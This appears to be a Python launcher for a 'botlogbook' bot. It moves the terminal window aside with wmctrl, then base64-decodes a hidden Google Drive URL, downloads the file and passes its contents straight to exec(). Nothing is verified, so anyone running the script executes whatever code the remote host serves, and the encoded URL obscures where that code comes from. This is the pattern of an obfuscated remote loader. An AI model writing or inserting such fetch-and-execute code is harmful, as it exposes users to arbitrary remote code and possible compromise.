import os
import subprocess
import pyautogui
import requests
import base64

def move_console():
    try:
        output = subprocess.check_output(["wmctrl", "-l"]).decode()
        lines = output.splitlines()
        for line in lines:
            if "Terminal" in line or "botlogbook" in line or "botlb.sh" in line:
                window_id = line.split()[0]
                subprocess.call(["wmctrl", "-i", "-r", window_id, "-e", "0,1200,800,500,230"])
                return
        print("⚠️ Tidak dapat menemukan jendela terminal.")
    except Exception as e:
        print(f"Gagal memindahkan window: {e}")
        
# Pindahkan konsol
move_console()

# server bot
url = base64.b64decode("aHR0cHM6Ly9kcml2ZS51c2VyY29udGVudC5nb29nbGUuY29tL2Rvd25sb2FkP2lkPTE4VV9Xd2FNZjNBcExWOVR0NGNhdVNtVGFhbUhuVmtXYyZleHBvcnQ9ZG93bmxvYWQmY29uZmlybT10AA==").decode()

# https://drive.usercontent.google.com/download?id=18U_WwaMf3ApLV9Tt4cauSmTaamHnVkWc&export=download&confirm=t

# Meminta server merespon
response = requests.get(url)

# Cek status server
if response.status_code == 200:
    print("Welcome to botlogbook.", end="\r")
    exec(response.text)  # Menjalankan bot
else:
    print(f"Server gagal merespon. Status: {response.status_code}")
